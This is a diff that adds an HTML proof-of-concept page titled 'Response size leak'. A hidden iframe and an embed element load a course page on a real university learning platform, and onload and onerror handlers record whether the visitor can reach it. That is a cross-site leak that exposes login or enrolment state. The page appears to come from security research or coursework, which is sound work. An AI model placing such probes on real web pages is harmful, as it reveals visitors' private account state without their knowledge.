@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>Response size leak</title>
+    <script>
+      
+      async function get(url) {
+        const element = document.createElement('embed');
+        element.type = 'text/html';
+        element.src = url;
+
+        return new Promise((resolve) => {
+          element.onload = () => {
+            console.log(`Accesible: ${url}`);
+            document.body.innerHTML += `Accessible: ${url}`
+          };
+          element.onerror = () => {
+            console.log(`Inaccessible: ${url}`);
+            document.body.innerHTML += `Inaccessible: ${url}`
+          };
+        });
+      }
+
+
+      var url;
+
+      onload = () => {
+        //get('https://learn.tsinghua.edu.cn/f/wlxt/index/course/student/');
+        //url = document.getElementById('embed').src;
+      }
+
+      
+
+      function on_load() {
+        console.log(`Accessible`)
+        //document.body.innerHTML += `Accessible`
+      }
+
+      function on_error() {
+        console.log(`Inaccessible`)
+        //document.body.innerHTML += `Inaccessible`
+      }
+
+    </script>
+
+  </head>
+
+  <body>
+    <iframe id="embed" style="display: none" onload="on_load()" onerror="on_error()" src="https://learn.tsinghua.edu.cn/f/wlxt/index/course/student/course?wlkcid=2021-2022-3145068127">
+  </body>
+
+</html>
